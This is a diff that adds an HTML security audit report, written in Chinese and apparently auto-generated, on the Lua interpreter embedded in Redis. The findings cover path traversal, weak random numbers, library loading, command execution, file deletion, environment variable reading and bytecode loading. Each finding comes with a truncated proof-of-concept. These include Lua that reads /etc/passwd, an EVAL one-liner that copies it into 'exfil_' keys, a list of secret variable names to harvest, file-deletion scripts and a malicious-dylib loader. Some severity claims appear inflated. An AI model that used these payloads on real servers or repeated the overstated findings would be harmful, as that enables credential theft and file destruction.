@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>CodeSentinel 安全审计报告 - redis</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 40px; background: #f5f5f5; }
+        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #1a1a2e; border-bottom: 3px solid #e94560; padding-bottom: 10px; }
+        h2 { color: #16213e; margin-top: 30px; }
+        .summary-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 20px 0; }
+        .summary-card { padding: 20px; border-radius: 8px; text-align: center; color: white; }
+        .summary-card h3 { margin: 0; font-size: 2em; }
+        .summary-card p { margin: 5px 0 0; }
+        .vuln-card { background: #f8f9fa; padding: 20px; margin: 15px 0; border-radius: 5px; }
+        pre { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; }
+        details { margin-top: 10px; }
+        summary { cursor: pointer; color: #e94560; font-weight: bold; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>CodeSentinel 安全审计报告</h1>
+    <p><strong>项目:</strong> redis | <strong>语言:</strong> {"C": 93.5, "Python": 5.5, "C++": 1.0} | <strong>时间:</strong> 2026-07-11 17:50:05</p>
+
+    <h2>执行摘要</h2>
+    <p>本次安全审计针对Redis项目（https://github.com/redis/redis）进行了源代码级安全评估。审计发现多个高危漏洞，主要集中在嵌入的Lua脚本引擎（deps/lua/）中，包括路径遍历漏洞（允许攻击者读取或写入任意文件）、不安全的随机数生成（可预测随机数序列）以及动态库加载路径注入（可能导致任意代码执行）。这些漏洞源于Lua标准库中缺乏输入验证和安全随机数机制，在Redis的Lua沙箱环境中可被利用，对服务器安全构成严重威胁。建议立即修复高优先级漏洞，并加强Lua沙箱的安全隔离。</p>
+    <p><strong>风险评分:</strong> 85/100</p>
+
+    <div class="summary-grid">
+        <div class="summary-card" style="background:#dc3545;"><h3>7</h3><p>严重</p></div>
+        <div class="summary-card" style="background:#fd7e14;"><h3>8</h3><p>高危</p></div>
+        <div class="summary-card" style="background:#ffc107;color:#333;"><h3>6</h3><p>中危</p></div>
+        <div class="summary-card" style="background:#28a745;"><h3>1</h3><p>低危</p></div>
+    </div>
+
+    <h2>漏洞详情</h2>
+    
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-43DF0CF9 - 路径遍历</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> deps/lua/src/liolib.c:115</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static int io_open (lua_State *L) {
+  const char *filename = luaL_checkstring(L, 1);
+  const char *mode = luaL_optstring(L, 2, &quot;r&quot;);
+  FILE **pf = newfile(L);
+  *pf = fopen(filename, mode);
+  return (*pf == NULL) ? pushresult(L, 0, filename) : 1;
+}</code></pre>
+                <p><strong>数据流:</strong> 用户通过Lua脚本调用io.open()函数，传入的filename参数直接传递给fopen()系统调用。攻击者可以使用&#x27;../&#x27;等路径遍历序列访问任意文件，如&#x27;../../etc/passwd&#x27;。</p>
+                <p><strong>判断理由:</strong> io.open()函数直接将用户提供的文件名传递给fopen()，没有进行任何路径规范化或安全检查。攻击者可以利用路径遍历技术读取或写入系统上的任意文件，包括敏感配置文件、密码文件等。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过路径遍历技术读取或写入系统上的任意文件。具体影响包括：1) 读取敏感配置文件（如/etc/passwd、/etc/shadow、数据库配置等）；2) 读取应用程序源代码和业务逻辑；3) 读取系统环境变量和进程信息；4) 在权限允许的情况下，可向任意路径写入恶意文件（如Webshell、cron任务等）；5) 可能导致权限提升、数据泄露、远程代码执行等严重后果。在Redis等嵌入Lua的环境中，如果允许用户控制io.open()参数，攻击者可以完全控制服务器文件系统。</p>
+                <details><summary>PoC代码</summary><pre><code>-- 仅供研究使用 (For Research Purposes Only)
+-- Lua io.open() 路径遍历漏洞 PoC
+-- 漏洞ID: VULN-43DF0CF9
+
+-- PoC 1: 读取 /etc/passwd 文件
+local function poc_read_passwd()
+    print(&quot;[*] 尝试读取 /etc/passwd (路径遍历攻击)...&quot;)
+    local file = io.open(&quot;../../etc/passwd&quot;, &quot;r&quot;)
+    if file then
+        local content = file:read(&quot;*a&quot;)
+        print(&quot;[+] 成功读取文件内容:&quot;)
+        print(content)
+        file:close()
+    else
+        print(&quot;[-] 文件打开失败，可能路径不正确或权限不足&quot;)
+    end
+en</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-03734290 - 路径遍历</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> deps/lua/src/liolib.c:175</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static int io_lines (lua_State *L) {
+  ...
+  else {
+    const char *filename = luaL_checkstring(L, 1);
+    FILE **pf = newfile(L);
+    *pf = fopen(filename, &quot;r&quot;);
+    if (*pf == NULL)
+      fileerror(L, 1, filename);
+    aux_lines(L, lua_gettop(L), 1);
+    return 1;
+  }
+}</code></pre>
+                <p><strong>数据流:</strong> 用户通过Lua脚本调用io.lines()函数并传入文件名参数，该参数直接传递给fopen()。攻击者可以传入包含路径遍历序列的文件名。</p>
+                <p><strong>判断理由:</strong> 与io.open()类似，io.lines()函数也直接将用户输入的文件名传递给fopen()，没有进行路径验证。攻击者可以利用此漏洞读取系统上的任意文件内容。</p>
+                <p><strong>影响分析:</strong> 攻击者可以读取服务器上的任意文件，包括系统配置文件(/etc/passwd、/etc/shadow)、应用配置文件、SSH密钥、数据库凭证等敏感信息。在Redis场景中，结合Redis的持久化功能，攻击者可能进一步获取服务器控制权。该漏洞影响所有使用Lua标准库且未做路径过滤的应用，特别是Redis的Lua沙箱实现。</p>
+                <details><summary>PoC代码</summary><pre><code>-- 仅供研究使用
+-- PoC: Lua io.lines() 路径遍历漏洞利用
+
+-- 场景1: 通过Redis EVAL命令利用
+-- 在Redis客户端执行:
+-- EVAL &quot;local lines = io.lines(&#x27;/etc/passwd&#x27;); for line in lines do redis.call(&#x27;SET&#x27;, &#x27;exfil_&#x27; .. line, line) end&quot; 0
+
+-- 场景2: 直接Lua脚本利用
+local function read_file(path)
+    local lines = io.lines(path)
+    if lines then
+        print(&quot;[+] 成功读取文件: &quot; .. path)
+        for line in lines do
+            print(line)
+        end
+    else
+        print(&quot;[-] 无法读取文件: &qu</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-22DAF001 - 不安全的随机数生成</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> deps/lua/src/lmathlib.c:148</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>lua_Number r = (lua_Number)(rand()%RAND_MAX) / (lua_Number)RAND_MAX;</code></pre>
+                <p><strong>数据流:</strong> math_random函数使用rand()生成随机数，rand()是C标准库中不安全的伪随机数生成器，其随机性较弱，容易被预测。</p>
+                <p><strong>判断理由:</strong> rand()函数使用线性同余算法，生成的随机数序列具有可预测性。对于安全敏感的应用（如加密、令牌生成、游戏等），应使用更安全的随机数生成器如arc4random()或从操作系统获取随机数。此外，代码中未调用srand()进行种子初始化（种子初始化在math_randomseed中，但需要用户显式调用），导致每次程序启动时随机数序列相同。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者预测Lua math.random生成的所有随机数。在Redis场景中，如果用户编写的Lua脚本使用math.random生成会话令牌、API密钥、验证码或加密密钥等安全敏感数据，攻击者可以完全预测这些值。具体影响包括：(1) 会话劫持 - 预测并重用会话令牌；(2) 身份冒充 - 预测验证码或一次性密码；(3) 加密破解 - 如果随机数用于密钥生成，可恢复加密密钥；(4) 竞态条件攻击 - 在需要随机数的安全协议中作弊。由于Redis广泛用于缓存、会话管理和实时应用，该漏洞的实际影响取决于具体使用场景。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC: 预测Lua math.random生成的随机数
+漏洞类型: 不安全的随机数生成 (CVE-like)
+影响组件: Redis Lua脚本环境 (deps/lua/src/lmathlib.c)
+
+仅供安全研究使用 - 请勿用于非法用途
+&quot;&quot;&quot;
+
+import ctypes
+import os
+import sys
+
+# ============================================================
+# 方法1: 利用未初始化种子的确定性行为
+# 如果用户未调用 math.randomseed()，则每次启动序列相同
+# ============================================================
+
+def predict_unseeded_random(count=10):
+    &quot;&quot;&quot;
+    模拟Lua math.random在未调用rando</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-C4710DBD - 不安全的随机数种子</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> deps/lua/src/lmathlib.c:170</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static int math_randomseed (lua_State *L) {
+  srand(luaL_checkint(L, 1));
+  return 0;
+}</code></pre>
+                <p><strong>数据流:</strong> math_randomseed函数接受用户提供的整数作为随机数种子，直接传递给srand()。</p>
+                <p><strong>判断理由:</strong> 用户可以直接控制随机数种子，这意味着如果攻击者知道或能猜测种子值，就可以预测后续所有随机数序列。在安全敏感场景中，这可能导致严重的安全问题。更好的做法是自动从系统熵源获取种子，而不是依赖用户输入。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者预测所有后续随机数序列，具体影响包括：1) 安全令牌可预测，导致会话劫持；2) 加密密钥可预测，破坏加密安全性；3) 游戏或抽奖系统中的随机结果可预测；4) 任何依赖随机数的安全机制都可能被绕过。在Redis等使用Lua脚本的应用中，如果随机数用于安全敏感场景，攻击者可以完全预测随机数序列，导致严重的安全问题。</p>
+                <details><summary>PoC代码</summary><pre><code>-- 仅供研究使用 - 不安全的随机数种子PoC
+-- 文件名: insecure_random_seed_poc.lua
+
+-- ============================================
+-- PoC 1: 基础种子预测演示
+-- 展示当种子已知时，可以完全预测随机数序列
+-- ============================================
+
+print(&quot;========================================&quot;)
+print(&quot;PoC 1: 基础种子预测演示&quot;)
+print(&quot;========================================&quot;)
+
+-- 攻击者知道种子值
+local known_seed = 12345
+
+-- 设置种子
+math.randomseed(known_seed)
+
+-- 生成并记录前5个随机数
+local sequence1 = {}
+for i = 1, 5 do
+    sequence1[</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-1E335F78 - 动态库加载路径注入</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> deps/lua/src/loadlib.c:103</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static void *ll_load (lua_State *L, const char *path) {
+  HINSTANCE lib = LoadLibraryA(path);
+  if (lib == NULL) pusherror(L);
+  return lib;
+}</code></pre>
+                <p><strong>数据流:</strong> 用户通过luaL_checkstring(L, 1)获取path参数 -&gt; 传递给ll_loadfunc -&gt; 调用ll_load -&gt; 直接传递给LoadLibraryA(path)</p>
+                <p><strong>判断理由:</strong> Windows平台下的ll_load函数直接使用传入的path参数调用LoadLibraryA加载动态库。path参数来自用户输入，没有进行路径验证。攻击者可以加载任意DLL文件，实现代码执行。</p>
+                <p><strong>影响分析:</strong> 未知</p>
+                <details><summary>PoC代码</summary><pre><code># 无法生成PoC</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-1819D7CD - 动态库加载路径注入</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> deps/lua/src/loadlib.c:168</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static void *ll_load (lua_State *L, const char *path) {
+  NSObjectFileImage img;
+  NSObjectFileImageReturnCode ret;
+  if(!_dyld_present()) {
+    lua_pushliteral(L, &quot;dyld not present&quot;);
+    return NULL;
+  }
+  ret = NSCreateObjectFileImageFromFile(path, &amp;img);</code></pre>
+                <p><strong>数据流:</strong> 用户通过luaL_checkstring(L, 1)获取path参数 -&gt; 传递给ll_loadfunc -&gt; 调用ll_load -&gt; 直接传递给NSCreateObjectFileImageFromFile(path, &amp;img)</p>
+                <p><strong>判断理由:</strong> Mac OS X平台下的ll_load函数直接使用传入的path参数调用NSCreateObjectFileImageFromFile加载动态库。path参数来自用户输入，没有进行路径验证。攻击者可以加载任意动态库文件，实现代码执行。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 任意代码执行 - 攻击者可以加载并执行任意动态库，获得与Lua解释器相同的权限；2) 权限提升 - 如果Lua解释器以高权限运行，攻击者可以获得更高权限；3) 数据泄露 - 攻击者可以访问和窃取Lua解释器可访问的所有数据；4) 持久化 - 攻击者可以在目标系统上安装后门或恶意软件；5) 横向移动 - 攻击者可以利用受感染的系统作为跳板攻击内部网络中的其他系统。在Redis场景中，攻击者可以完全控制Redis服务器，执行任意系统命令，访问和修改Redis中的所有数据。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-1819D7CD - Lua动态库加载路径注入漏洞
+仅供安全研究使用，请勿用于非法用途
+&quot;&quot;&quot;
+
+import socket
+import sys
+
+# 目标Redis服务器配置
+REDIS_HOST = &#x27;127.0.0.1&#x27;
+REDIS_PORT = 6379
+
+# 恶意动态库路径（攻击者控制的位置）
+# 注意：实际利用时需要替换为攻击者可控的.dylib文件路径
+MALICIOUS_LIB_PATH = &#x27;/tmp/evil.dylib&#x27;
+
+def send_redis_command(sock, command):
+    &quot;&quot;&quot;发送Redis命令并接收响应&quot;&quot;&quot;
+    sock.sendall(command.encode())
+    response = sock.recv(4096)
+    return response.deco</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-3C89A7BA - 命令注入</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> deps/lua/src/loslib.c:44</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static int os_execute (lua_State *L) {
+  lua_pushinteger(L, system(luaL_optstring(L, 1, NULL)));
+  return 1;
+}</code></pre>
+                <p><strong>数据流:</strong> 用户通过Lua脚本调用os.execute()函数，传入的字符串参数直接传递给system()函数执行。攻击者可以构造恶意命令字符串，导致任意命令执行。</p>
+                <p><strong>判断理由:</strong> os_execute函数直接使用system()调用用户提供的字符串，没有任何过滤或转义。攻击者可以通过Lua脚本传入任意shell命令，如&#x27;rm -rf /&#x27;或&#x27;cat /etc/passwd&#x27;等，导致严重的安全风险。这是典型的命令注入漏洞。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 完全控制Redis服务器操作系统；2) 执行任意系统命令；3) 读取、修改或删除服务器文件；4) 建立反向Shell实现持久化控制；5) 横向移动攻击内网其他系统。在云环境或容器化部署中，可能导致整个基础设施被攻陷。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for Lua os.execute() Command Injection (VULN-3C89A7BA)
+仅供研究使用 - For Research Purposes Only
+
+该PoC演示了在Redis环境中通过Lua脚本执行任意系统命令的漏洞利用路径。
+注意：默认Redis配置下Lua沙箱禁用了os.execute，需要管理员显式启用。
+&quot;&quot;&quot;
+
+import redis
+import sys
+
+# 配置Redis连接参数
+REDIS_HOST = &#x27;127.0.0.1&#x27;
+REDIS_PORT = 6379
+REDIS_PASSWORD = None  # 如果设置了密码，请在此填写
+
+def check_redis_connection():
+    &quot;&quot;&quot;检查Redis连接状态&quot;&quot;&quot;
+    try:
+        r = redis.Redis(
+           </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-39FCC22C - 命令注入</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> deps/lua/src/loslib.c:49</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static int os_remove (lua_State *L) {
+  const char *filename = luaL_checkstring(L, 1);
+  return os_pushresult(L, remove(filename) == 0, filename);
+}</code></pre>
+                <p><strong>数据流:</strong> 用户通过Lua脚本调用os.remove()函数，传入的文件名参数直接传递给remove()系统调用。攻击者可以删除任意文件。</p>
+                <p><strong>判断理由:</strong> os_remove函数直接使用用户提供的文件名调用remove()，没有进行路径验证或沙箱限制。攻击者可以通过路径遍历（如&#x27;../../etc/passwd&#x27;）删除系统关键文件，造成拒绝服务或系统破坏。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者删除任意文件，可能导致：1) 删除系统关键配置文件导致服务不可用；2) 删除数据库文件导致数据丢失；3) 删除日志文件掩盖攻击痕迹；4) 删除认证文件（如/etc/shadow）导致权限提升；5) 删除可执行文件导致系统功能失效。在Redis场景中，攻击者可以通过EVAL命令远程触发，危害极大。</p>
+                <details><summary>PoC代码</summary><pre><code>-- 仅供研究使用
+-- PoC: Lua os.remove() 任意文件删除漏洞
+
+-- 场景1: 删除当前目录下的文件
+local result = os.remove(&quot;test.txt&quot;)
+print(&quot;删除结果:&quot;, result)
+
+-- 场景2: 路径遍历删除系统关键文件
+-- 注意: 实际利用时请勿执行，仅用于理解漏洞原理
+-- local result = os.remove(&quot;../../etc/passwd&quot;)
+-- print(&quot;删除结果:&quot;, result)
+
+-- 场景3: 删除配置文件
+-- local result = os.remove(&quot;/etc/nginx/nginx.conf&quot;)
+-- print(&quot;删除结果:&quot;, result)
+
+-- 场景4: 批量删除文件（演示危害）
+local files_to_delete = {
+    &quot;important.log&quot;,
+    &quot;config.ini</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-F6D5EF2F - 信息泄露</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> deps/lua/src/loslib.c:70</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static int os_getenv (lua_State *L) {
+  lua_pushstring(L, getenv(luaL_checkstring(L, 1)));  /* if NULL push nil */
+  return 1;
+}</code></pre>
+                <p><strong>数据流:</strong> 用户通过Lua脚本调用os.getenv()函数，传入的环境变量名参数直接传递给getenv()系统调用。攻击者可以读取任意环境变量。</p>
+                <p><strong>判断理由:</strong> os_getenv函数直接使用用户提供的环境变量名调用getenv()，没有进行任何限制。攻击者可以读取敏感环境变量，如PATH、HOME、SECRET_KEY、数据库密码等，导致敏感信息泄露。</p>
+                <p><strong>影响分析:</strong> 攻击者可以通过os.getenv()读取任意环境变量，包括但不限于：数据库连接密码、API密钥、会话密钥、云服务凭证、SSH密钥等。这些敏感信息一旦泄露，可能导致：1) 数据库被未授权访问；2) 云服务资源被滥用；3) 会话劫持；4) 横向移动至其他系统。在容器化环境中，环境变量常被用于传递配置和密钥，泄露风险更高。</p>
+                <details><summary>PoC代码</summary><pre><code>-- 仅供研究使用 - Lua环境变量信息泄露PoC
+-- 漏洞: os.getenv() 未限制环境变量读取
+
+-- PoC 1: 读取常见敏感环境变量
+local function poc_read_sensitive_env()
+    print(&quot;=== PoC: 读取敏感环境变量 ===&quot;)
+    
+    -- 尝试读取可能包含敏感信息的环境变量
+    local sensitive_vars = {
+        &quot;PATH&quot;,
+        &quot;HOME&quot;,
+        &quot;USER&quot;,
+        &quot;USERNAME&quot;,
+        &quot;SECRET_KEY&quot;,
+        &quot;API_KEY&quot;,
+        &quot;DB_PASSWORD&quot;,
+        &quot;DATABASE_URL&quot;,
+        &quot;AWS_SECRET_ACCESS_KEY&quot;,</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-FE6687D2 - 不安全的临时文件创建</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> deps/lua/src/loslib.c:62</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static int os_tmpname (lua_State *L) {
+  char buff[LUA_TMPNAMBUFSIZE];
+  int err;
+  lua_tmpnam(buff, err);
+  if (err)
+    return luaL_error(L, &quot;unable to generate a unique filename&quot;);
+  lua_pushstring(L, buff);
+  return 1;
+}</code></pre>
+                <p><strong>数据流:</strong> os_tmpname函数生成临时文件名但不创建文件，存在竞争条件风险。</p>
+                <p><strong>判断理由:</strong> 该函数只生成临时文件名而不实际创建文件，存在TOCTOU竞争条件。攻击者可以在文件名生成和实际使用之间创建同名文件，可能导致符号链接攻击或文件覆盖。更安全的做法是使用mkstemp()等函数同时创建文件。</p>
+                <p><strong>影响分析:</strong> 攻击者可以利用此TOCTOU竞争条件漏洞，通过符号链接攻击覆盖任意文件。如果目标文件是系统关键文件（如 /etc/passwd、SSH授权密钥文件、Web应用配置文件等），可能导致权限提升、服务拒绝或数据泄露。在Redis等使用Lua脚本的服务器环境中，攻击者可以通过精心构造的Lua脚本触发此漏洞，实现任意文件覆盖。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-FE6687D2 - 不安全的临时文件创建 (TOCTOU竞争条件)
+仅供安全研究使用，请勿用于非法用途。
+&quot;&quot;&quot;
+
+import os
+import tempfile
+import threading
+import time
+import stat
+
+# 配置：目标敏感文件路径（演示用，请勿指向真实系统文件）
+TARGET_FILE = &quot;/tmp/victim_sensitive_file.txt&quot;
+# 符号链接目标（攻击者想要覆盖的文件）
+SYMLINK_TARGET = &quot;/etc/passwd&quot;  # 仅用于演示，实际测试请使用无害路径
+
+# 创建演示用的敏感文件
+with open(TARGET_FILE, &quot;w&quot;) as f:
+    f.write(&quot;This is a sensitive file content.\n&quot;)
+
+print(f&quot;</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-D8E6DA72 - 不安全的信号处理</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> deps/lua/src/lua.c:47</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static void laction (int i) {
+  signal(i, SIG_DFL); /* if another SIGINT happens before lstop,
+                              terminate process (default action) */
+  lua_sethook(globalL, lstop, LUA_MASKCALL | LUA_MASKRET | LUA_MASKCOUNT, 1);
+}</code></pre>
+                <p><strong>数据流:</strong> SIGINT信号触发 -&gt; laction函数被调用 -&gt; 设置信号处理函数为SIG_DFL -&gt; 设置lua hook</p>
+                <p><strong>判断理由:</strong> 信号处理函数laction中调用了lua_sethook，而lua_sethook不是异步信号安全的函数。在多线程环境中，如果在信号处理函数中调用非异步信号安全的函数，可能导致竞态条件、死锁或数据损坏。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过发送SIGINT信号，在Lua解释器执行关键操作时触发非异步信号安全的lua_sethook函数调用。这可能导致：1) 竞态条件 - 多个信号处理同时修改Lua虚拟机内部状态；2) 数据损坏 - hook链表等内部数据结构被破坏；3) 死锁 - 在持有锁的情况下被中断；4) 程序崩溃 - 由于状态不一致导致的段错误。虽然漏洞严重性为medium，但在多线程环境或需要处理用户输入信号的场景中，可能被利用来造成拒绝服务或更严重的安全问题。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-D8E6DA72 - 不安全的信号处理
+仅供安全研究使用
+
+该PoC演示了在Lua解释器执行关键操作时发送SIGINT信号，
+触发非异步信号安全函数lua_sethook的调用，可能导致竞态条件。
+&quot;&quot;&quot;
+
+import subprocess
+import signal
+import time
+import os
+import sys
+
+# 创建触发漏洞的Lua脚本
+# 该脚本会执行大量内存分配和表操作，增加竞态条件触发概率
+lua_script = &#x27;&#x27;&#x27;
+-- 模拟复杂的内存操作和表操作
+local function trigger_race_condition()
+    local large_table = {}
+    for i = 1, 100000 do
+        large_table[i] = {
+            string.rep(&quot;A&quot;, 1000),
+  </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-1A5C4D19 - 不安全的反序列化 - 缺少输入验证</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> deps/lua/src/lundump.c:1</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static void LoadBlock(LoadState* S, void* b, size_t size)
+{
+ size_t r=luaZ_read(S-&gt;Z,b,size);
+ IF (r!=0, &quot;unexpected end&quot;);
+}
+
+static int LoadInt(LoadState* S)
+{
+ int x;
+ LoadVar(S,x);
+ IF (x&lt;0, &quot;bad integer&quot;);
+ return x;
+}
+
+static TString* LoadString(LoadState* S)
+{
+ size_t size;
+ LoadVar(S,size);
+ if (size==0)
+  return NULL;
+ else
+ {
+  char* s=luaZ_openspace(S-&gt;L,S-&gt;b,size);
+  LoadBlock(S,s,size);
+  return luaS_newlstr(S-&gt;L,s,size-1);
+ }
+}
+
+static void LoadCode(LoadState* S, Proto* f)
+{
+ int n=LoadInt(S);
+ f-&gt;code=luaM_newvector(S-&gt;L,n,Instruction);
+ f-&gt;sizecode=n;
+ LoadVector(S,f-&gt;code,n,sizeof(Instruction));
+}
+
+static void LoadConstants(LoadState* S, Proto* f)
+{
+ int i,n;
+ n=LoadInt(S);
+ f-&gt;k=luaM_newvector(S-&gt;L,n,TValue);
+ f-&gt;sizek=n;
+ ...
+}
+
+static Proto* LoadFunction(LoadState* S, TString* p)
+{
+ Proto* f;
+ if (++S-&gt;L-&gt;nCcalls &gt; LUAI_MAXCCALLS) error(S,&quot;code too deep&quot;);
+ f=luaF_newproto(S-&gt;L);
+ ...
+ LoadCode(S,f);
+ LoadConstants(S,f);
+ LoadDebug(S,f);
+ ...
+ return f;
+}
+
+Proto* luaU_undump (lua_State* L, ZIO* Z, Mbuffer* buff, const char* name)
+{
+ LoadState S;
+ ...
+ LoadHeader(&amp;S);
+ return LoadFunction(&amp;S,luaS_newliteral(L,&quot;?&quot;));
+}</code></pre>
+                <p><strong>数据流:</strong> 用户提供的二进制数据通过ZIO流进入luaU_undump函数 -&gt; LoadHeader仅检查文件头签名和版本 -&gt; LoadFunction递归加载函数原型 -&gt; LoadCode从输入读取指令数量并分配内存 -&gt; LoadConstants从输入读取常量数量和类型 -&gt; LoadString从输入读取字符串大小并分配内存 -&gt; LoadDebug从输入读取调试信息 -&gt; 整个过程缺乏对输入数据大小和内容的充分验证</p>
+                <p><strong>判断理由:</strong> 这是一个Lua字节码加载器，存在多个严重的安全问题：1) LoadInt只检查负数，不检查上界，攻击者可以提供极大的整数导致内存分配过大或整数溢出；2) LoadString读取size_t类型的大小值，攻击者可以提供任意大的值导致内存耗尽或缓冲区溢出；3) LoadCode读取指令数量后直接分配内存，没有大小限制；4) LoadConstants和LoadDebug同样没有对数组大小进行合理限制；5) 整个反序列化过程缺乏对输入数据的完整性校验，攻击者可以构造恶意的二进制chunk导致任意代码执行或拒绝服务攻击。虽然代码中有LUAC_TRUST_BINARIES宏控制错误处理，但默认情况下仍然存在严重的内存安全风险。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过构造恶意的Lua字节码文件实现：1) 拒绝服务攻击 - 通过内存耗尽或栈溢出导致Lua解释器崩溃；2) 潜在任意代码执行 - 通过缓冲区溢出覆盖关键数据结构，可能实现代码执行。由于Lua常用于游戏、嵌入式系统和Web服务器，成功利用可能导致服务中断、数据泄露或远程代码执行。CVSS评分估计为9.8（Critical），因为攻击复杂度低，无需认证，且影响机密性、完整性和可用性。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for Lua bytecode loader unsafe deserialization vulnerability
+VULN-1A5C4D19
+
+仅供研究使用 - For research purposes only
+
+This PoC demonstrates multiple attack vectors:
+1. Integer overflow in LoadInt -&gt; memory exhaustion
+2. Arbitrary large string size in LoadString -&gt; buffer overflow
+3. Excessive code size in LoadCode -&gt; memory exhaustion
+&quot;&quot;&quot;
+
+import struct
+import sys
+
+# Lua 5.1 bytecode header constants
+LUA_SIGNATURE = b&#x27;\x1bLua&</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-7B107532 - 整数溢出/内存分配过大</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> deps/lua/src/lundump.c:83</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static void LoadCode(LoadState* S, Proto* f)
+{
+ int n=LoadInt(S);
+ f-&gt;code=luaM_newvector(S-&gt;L,n,Instruction);
+ f-&gt;sizecode=n;
+ LoadVector(S,f-&gt;code,n,sizeof(Instruction));
+}</code></pre>
+                <p><strong>数据流:</strong> 用户输入 -&gt; LoadInt读取int值n -&gt; luaM_newvector使用n分配内存 -&gt; LoadVector读取n*sizeof(Instruction)字节数据</p>
+                <p><strong>判断理由:</strong> LoadInt只检查n&lt;0，但没有检查n的上界。攻击者可以提供极大的正整数（如0x7FFFFFFF），导致luaM_newvector尝试分配巨大的内存块，可能耗尽系统内存或触发整数溢出。sizeof(Instruction)通常为4字节，n*4可能溢出size_t类型。</p>
